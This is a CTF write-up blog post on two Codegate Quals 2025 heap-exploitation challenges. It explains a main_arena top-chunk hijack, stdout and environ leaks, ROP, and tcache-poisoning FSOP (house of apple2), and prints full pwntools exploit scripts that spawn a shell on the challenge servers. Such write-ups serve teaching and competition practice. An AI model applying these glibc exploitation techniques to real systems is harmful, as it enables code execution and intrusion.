---
date: 2025-03-29 10:21:56
layout: post
title: Unexpected heap primitive and unintended solve
subtitle: codegate quals 2025 writeup
description: >-
    第一次成功飞鱼旗！嘿嘿嘿
image: >-
  /assets/img/uploads/cat.jpg
optimized_image: >-
  /assets/img/uploads/cat.jpg
category: ctf
tags:
  - pwn
  - heap exploitation
  - leak without show functions
author: rosayxy
paginate: true
---

I played the codegate quals 2025 challenge yesterday. Really enjoyed playing in the competition lol. The best part is that I spent a lot of time exploring a heap exploitation primitive that I hadn't previously met in any ctf challs before, and successfully hacked it. However, it left me no time to complete the other pwn challenges, which is a bit sad.      

## secret note - unintended solution
The vulnerable function is as below    

![alt_text](/assets/img/uploads/vuln_create.png)   

The structure of the chunk is as below:   
```c
struct Chunk{
    void* ptr;
    int key;
    int size;
}
```

The intended vulnerability is that, if you let's say, create a chunk with index 0 and size 0x100 (which will cause the program to do a 0x100 malloc), then you call the create function again with index 0 and size 0x800, then for the indexed chunk, **only the size will be updated**. Then you have a heap overflow primitive, and you can use edit function to modify content outside your chunk, which is fairly easy to exploit with.    

However, the vulnerability that I found initially is that this malloc does not clear the chunk's fd pointer, in other words, the ptr field of the newly created struct will not be zeroed upon initialization. Thus, if you, let's say, create a 0x800-sized chunk with index 0, you can write to the fd's pointed content.     

Since it is libc-2.35, the fd pointer of tcache and fastbins are all hardened. The one I could use is the fd pointer of the unsorted bin, which **points to the top chunk pointer in main arena** (which is main arena + 96 as below). Therefore, the initial primitive is an main_arena overwrite, which I have never met in previous challenges before.        

![alt_text](/assets/img/uploads/main_arena.png)    

Moreover, if we attempt to malloc a big enough chunk that cannot be taken from any of the bins, our libc allocator will get a chunk at the address of top chunk and incline the top pointer.    
Thus, if we can overwrite the last two bytes of the top chunk address in main_arena to a lower address on the heap and malloc a big enough chunk, it will **position the chunk to the lowered address on heap, thus resulting in a heap chunk overlapping primitive**.     

However, this requires a brute force attack with a 1/16 probability, since the highest 4 bits of the overwrite 2 bytes are not known to us


### leaks

The given binary doesn't have a function to show the chunk's contents, and the output information is far from leaking. Therefore, how can we get the heap and libc leak we wanted?     

The answer is an IO_2_1_stdout leak, as demonstrated in [this blog](https://blog.wjhwjhn.com/posts/_io_2_1_stdout_-leak/)    

Our heap layout currrently looks like this:   
![alt_text](/assets/img/uploads/heap_layout.jpg)

We use the overlapping heap (which is malloced through the top chunk) to **overwrite the lowest 2 bytes of the main_arena + 0x60 pointer to the lowest 2 bytes of _IO_2_1_stdout_**, and then we can edit through the corresponding chunk to the libc related pointer(we will address it as the **mischief pointer** in the text below), and **change the flag and IO_write_base of the stdout's IO_file structure**.     

Moreover, I choose to partial overwrite the IO_write_base to point to the main_arena + 0x60 position, so it is efficient to leak the libc and heap pointers in the first 0x20 bytes! Easy to parse!    

This also requires a 1/16 bruteforce for the overwrite of _IO_2_1_stdout_.      

### further exploit
With the heap overlapping primitive to change the value of the mischief pointer, we have a arbituary write primitive.    

At first, I thought about writing to stdout in libc to a heap address and trigger the IO flow to run house of apple2 (the normal conditions of house of apple2 are not satisfied).   

However, the `printf` and `puts` functions' IO flow is not referenced through the stdout pointer in libc but the `stdout@GLIBC_2_2_5` in proc, so it would require an additional proc leak, which is hard.    

Thus, we think about playing the environ leak and write to stack to do a custom rop.   

### environ leak

We write the mischief pointer to _IO_2_1_stdout_ again and trigger the _IO_2_1_stdout_ leak.   
This time, we overwrite the _IO_write_base to environ's pointer address in libc, write the _IO_write_pointer and _IO_write_end to environ's address + 0x10. Then we have our stack address leak!    

### ROP
Overwrite the mischief pointer to point to the return address and edit it with the rop chain, and our work is done!   

### conclusion
The overall routine is:   
1. hijack main_arena's top chunk
2. construct heap overlapping
3. write to `_IO_2_1_stdout_` for heap and libc leaks
4. write to `_IO_2_1_stdout_` again for an environ leak
5. overwrite heap pointer to stack
6. do ROP

### exp
It requires a 1/256 brute force overall.   

```py
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
cnt = 0x400
while(True):
    try:
        p = remote("3.38.215.165",13378)
        libc = ELF("./libc.so.6")
        def create(idx,key,size,data,is_data=True):
            p.recvuntil("> ")
            p.sendline("1")
            p.recvuntil("Index: ",timeout = 1)
            p.sendline(str(idx))
            p.recvuntil("Key: ")
            p.sendline(str(key))
            p.recvuntil("Size: ")
            p.sendline(str(size))
            if is_data:
                p.recvuntil("Data: ")
                p.send(data)

        def edit(idx,key,data):
            p.recvuntil("> ")
            p.sendline("2")
            p.recvuntil("Index: ",timeout = 1)
            p.sendline(str(idx))
            p.recvuntil("Key: ")
            p.sendline(str(key))
            p.recvuntil("Data")
            p.send(data)

        def delete(idx,key):
            p.recvuntil("> ")
            p.sendline("3")
            p.recvuntil("Index: ",timeout = 1)
            p.sendline(str(idx))
            p.recvuntil("Key: ")
            p.sendline(str(key))

        # TODO 试一下从 unsorted bin 这些里面拿堆块,需要申请一个块到 stdout 附近，试一下自修改那个有 libc_related_addr 的堆块，把他地址部分覆盖到 stdout 附近然后改内容
        # 由 notice 判断需要爆破一个东西
        for i in range(9):
            create(i,0,0x400,b"a"*8+b"\n")

        for i in range(8):
            delete(i,0)

        for i in range(7):
            create(i,0,0x400,b"a"*8+b"\n")
        create(7,0,0x300,b"a"*0x2e0 + p64(0) + p64(0x1ed11) + b"\n")
        # gdb.attach(p,"b* $rebase(0x1359)")
        # pause()
        create(9,0,0x800,b"a"*8+b"\n",False) # vuln
        # try edit main arena's top chunk to lower address
        # 爆破 key
        key = 0

        for i in range(0x1000):
            key = 0x7fff-i
            p.recvuntil("> ")
            p.sendline("2") # edit
            p.recvuntil("Index: ")
            p.sendline("9")
            p.recvuntil("Key: ")
            p.sendline(str(key))
            res = p.recv(4)
            print(res)
            if res == b"Data":

                log.info("key: " + hex(key))
                sleep(1)
                break
            else:
                continue
        if key == 0x7000:
            log.info("key: error!" + hex(key))
            continue
        # 可以覆盖为 x2f0
        p.send(b"\xf0\x32")

        create(10,0,0x400,b"a"*0x10 + p64(0)+p64(0x21)+p16(0xd780))
        edit(9,key,p64(0xfbad1800)+p64(0)*3 + p16(0xcce0)) # 改 write_start 为 main_arena + 96 的地址
        # 现在有堆重叠，想想怎么 leak, 有 libc 之后可以直接修改 top_chunk 指针到 stdout 这样方便一点
        p.recv(8) # 读入那个 "(2048): "
        heap_leak =  u64(p.recv(8)) # leak heap addr
        heap_base = heap_leak - 0x2700
        log.info("heap_base: " + hex(heap_base))
        p.recv(8)
        libc_leak = u64(p.recv(8)) # leak libc addr
        libc_base = libc_leak - 0x21ace0
        system_addr = libc_base + libc.sym["system"]
        pop_rdi_ret = libc_base + 0x2a3e5
        ret = libc_base + 0x2a3e6
        binshell = libc_base + 0x1D8678
        stdout = libc_base + 0x21b868
        log.info("libc_base: " + hex(libc_base))
        sleep(1)
        edit(9,key,p64(0xfbad1800)+p64(0)*3 + p64(libc_base + 0x0222200)+p64(libc_base + 0x222200+0x10)+p64(libc_base + 0x222200 + 0x10)) # 改 write_start 为 environ 来 leak
        p.recv(8) # 读入那个 "(2048): "
        environ_leak = u64(p.recv(8)) # leak environ addr
        ret_addr = environ_leak - 0x140 
        log.info("environ_leak: " + hex(environ_leak))
        # 0x7fff55f989e8 - 0x7fff55f988a8 
        edit(10,0,b"a"*0x10 + p64(0)+p64(0x21)+p64(ret_addr))
        edit(9,key,p64(pop_rdi_ret)+p64(binshell)+p64(ret)+p64(system_addr))
        p.recvuntil("Edit completed")
        p.sendline("cat flag")
        p.interactive()

    except Exception as e:
        log.info("Error: " + str(e))
        p.close()
        cnt -= 1
        if cnt == 0:
            exit(0)
        continue
```

## todo list - intended solution
not a difficult problem but a bit nasty.    

The given vulnerability is a heap overflow of 15 bytes.   

The leaking of the heap address is trivial, and the libc leak requires me to construct a fake big enough chunk and freeing it to put into unsorted bin.   

Then we will just play FSOP with house of apple2.   

Requires me 5 tcache poisoning attempts as below (so dirty!):
1. set up the "footer" of the fake 0x460 big chunk
2. set up the "footer" for the footer of the fake 0x460 big chunk, or it will crash when freeing the fake chunk
3. get a chunk to the fake chunk's `size` field to edit it to normal(which is `p64(0) + p64(0x461)`) after the unsorted bin leak, or else the malloc operations afterwards will crash
4. edit the _lock field of the fake IO_FILE on heap
5. edit the IO_list_all to fake IO_FILE's address on heap    

### exp
```py
from pwn import*
context(os='linux', arch='amd64', log_level='debug')
# p = process("./prob")
p = remote("43.203.168.199",13379)
libc = ELF("./libc.so.6")
def create(idx,title,desc):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Title: ")
    p.send(title)
    p.recvuntil("Desc : ")
    p.send(desc)

def edit(idx,desc):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Desc : ")
    p.send(desc)

def show(idx):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def complete(idx):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def load(no,idx):
    p.recvuntil("> ")
    p.sendline("5")
    p.recvuntil("No : ")
    p.sendline(str(no))
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil("> ")
    p.sendline("6")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

create(4,b"||"+b"a"*0xd,b"a"*0x10)
create(2,b"||"+b"a"*0xd,b"a"*0x10)
create(0,b"||"+b"a"*0xd,b"a"*0x11)
create(1,b"a"*0xd,b"a"*0x18)
complete(1) # normal no 0
delete(1)
complete(0) # overflow size no 1
# gdb.attach(p,'''
# b* $rebase(0x202c)
# b* $rebase(0x209e)
# b* $rebase(0x1e1b)
# ''')
# pause()
load(1,0)
show(0)
# leak heap
p.recvuntil("aaaaaaaaaaaaa||aaaaaaaaaaaaaaaaa")
heap_base = u64(p.recv(5).ljust(8,b"\x00"))*0x1000
log.info("heap_base: "+hex(heap_base))
# leak libc tcache poisoning

target_heap_addr = heap_base + 0x730 # todo
fd = target_heap_addr ^ (heap_base//0x1000)
edit(2,b"a"*0x11+p32(fd%0x100000000))
delete(0)
complete(2) # overwrite fd

load(2,2)

# 注意 create 全用的是 calloc
load(0,0) # 0x2e0
load(0,3)
edit(3,p64(0)+p64(0x41))
edit(4,b"a"*9+p64(0x461))
complete(4)
load(3,4)
fd1 = (heap_base + 0x770) ^ (heap_base//0x1000)
create(7,b"||"+b"a"*0xd,b"a"*0x11+p32(fd1%0x100000000))

create(6,b"||"+b"a"*0xd,b"a"*0x10)
create(5,b"||"+b"a"*0xd,b"a"*0x10)
delete(5)
delete(6)

complete(7)

load(4,7)
load(0,5)
load(0,6)
edit(6,p64(0)+p64(0x41))
fd2 = (heap_base + 0x2d0)^(heap_base//0x1000)

# get a chunk to unsorted bin's size
create(7,b"||"+b"a"*0xd,b"a"*0x11+p32(fd2%0x100000000))
create(6,b"||"+b"a"*0xd,b"a"*0x10)
create(5,b"||"+b"a"*0xd,b"a"*0x10)
delete(5)
delete(6)
complete(7)
load(5,7)
load(0,5)
load(0,6)
edit(6,p64(0)+p64(0x461))


delete(2) # trigger!
complete(4)
load(1,4)
show(4)

p.recvuntil("aaaaaaaaaaaaa||aaaaaaaaaaaaaaaaa")
libc_leak = u64(p.recv(6).ljust(8,b"\x00"))
log.info("libc_leak: "+hex(libc_leak))
libc_base = libc_leak - 0x203b20
log.info("libc_base: "+hex(libc_base))
edit(6,p64(0)+p64(0x461))

# construct io_file
fake_io_addr = heap_base + 0x2f0
b_addr = fake_io_addr + 0xd0 - 0x68
system_addr = libc_base + libc.sym["system"]

fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x21ba60)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x215F58-0x40+libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)
create(0,b"a",p64(0)*2 + b"  sh;".ljust(0x8,b"\x00"))
create(0,b"a",p64(0)+p64(0)+p64(2))
create(0,b"a",p64(0)*3)
create(0,b"a",p64(0)*3)
create(0,b"a",p64(0)*3)
create(0,b"a",p64(0)*2+p64(fake_io_addr))
create(0,b"a",p64(0)*3)
create(0,b"a",p64(system_addr)+p64(libc_base + 0x202228)+p64(b_addr))

# modify fake_io_file + 0x80
lock_ptr = fake_io_addr + 0x80
fd4 = lock_ptr^(heap_base//0x1000)
create(7,b"||"+b"a"*0xd,b"a"*0x11+p32(fd4%0x100000000))
create(6,b"||"+b"a"*0xd,b"a"*0x10)
create(5,b"||"+b"a"*0xd,b"a"*0x10)
delete(5)
delete(6)
complete(7)
load(7,7)
load(0,5)
load(0,6)
edit(6,p64(0)+p64(libc_base + 0x205700))

io_list_all = libc_base + 0x2044c0
fd3 = io_list_all^(heap_base//0x1000)

create(7,b"||"+b"a"*0xd,b"a"*0x11+p64(fd3)[:6])
create(6,b"||"+b"a"*0xd,b"a"*0x10)
create(5,b"a"*0xd,b"a"*0x8)

complete(5)
delete(6)
complete(7)
load(9,7)
load(8,5)

load(8,6)

edit(6,p64(fake_io_addr))
# trigger
delete(10)

p.interactive()
# 想到一个不用打 IO_FILE 的方法：通过魔改 stdout 来 leak environ 然后打栈溢出，可以 mark 一下
```